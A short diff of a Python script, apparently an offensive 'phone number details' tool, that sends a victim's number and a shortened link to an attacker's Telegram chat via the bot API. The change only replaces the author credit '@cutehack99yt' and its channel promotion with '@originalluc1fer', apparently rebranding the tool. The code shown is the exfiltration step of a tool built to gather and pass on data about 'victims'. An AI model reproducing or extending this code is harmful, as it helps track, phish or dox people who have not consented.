@@ -88,7 +88,7 @@ user_id = input(colored("Enter your Telegram user ID: ", 'cyan'))
 telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 telegram_params = {
     "chat_id": user_id,
-    "text": colored(f" ¥victims details¥\n\n Click below link for victim's phone number details\n\n *number* ={victim_number}:\n\n *details*= {shortened_link}\n\n\n\nThis Tool Was Made By @cutehack99yt\n\nJoin our channel for more tools\n@cutehackers", 'magenta')
+    "text": colored(f" ¥victims details¥\n\n Click below link for victim's phone number details\n\n *number* ={victim_number}:\n\n *details*= {shortened_link}\n\n\n\nThis Tool Was Made By @originalluc1fer", 'magenta')
 }
 
 telegram_response = requests.post(telegram_url, params=telegram_params)
